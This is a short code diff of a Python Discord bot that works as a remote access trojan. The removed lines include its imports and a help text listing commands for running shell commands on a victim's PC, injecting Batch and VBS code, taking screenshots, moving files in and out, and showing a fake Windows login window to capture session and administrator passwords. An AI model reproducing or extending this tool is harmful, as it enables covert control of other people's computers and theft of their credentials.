@@ -1,30 +1,3 @@
-import os
-import discord 
-from discord.ext import commands
-import subprocess
-import requests
-import pyautogui
-
-
-#######################
-
-prefix = '$'
-token = 'TOKEN'
-bot = commands.Bot(command_prefix=prefix)
-cmds=f"""
-All commands:
-`{prefix}cmd <JUSTIFICATION>` : start a command in the user console.
-`(example: {prefix}cmd ping google.com)`
-`{prefix}batinjector <JUSTIFICATION>` : insert code Batch on the user PC.
-`{prefix}vbsinjector <JUSTIFICATION>` : insert code VBS on the user PC.
-`{prefix}screenshot` : Get a screenshot of the user PC.
-`{prefix}ufile <Name ARCHIVE>` : Upload a user file 
-(Maximum weight 8mb on v1 servers, if your server is v2 you can 50mb or v3 with 100mb)
-`{prefix}dfile <URL ARCHIVE> <PATH WHERE IT WILL BE SAVED>` : Download a file to the user PC
-`{prefix}cd <Route>` : Navigate through the user PC folders
-`{prefix}windowspass` : Generates a realistic window for the user to enter their session credentials (This to obtain the password and ADMINISTRATOR user)
-`{prefix}whoami` : Get information about the PC the file is running on.
-"""
 
 @bot.event
 async def on_ready():
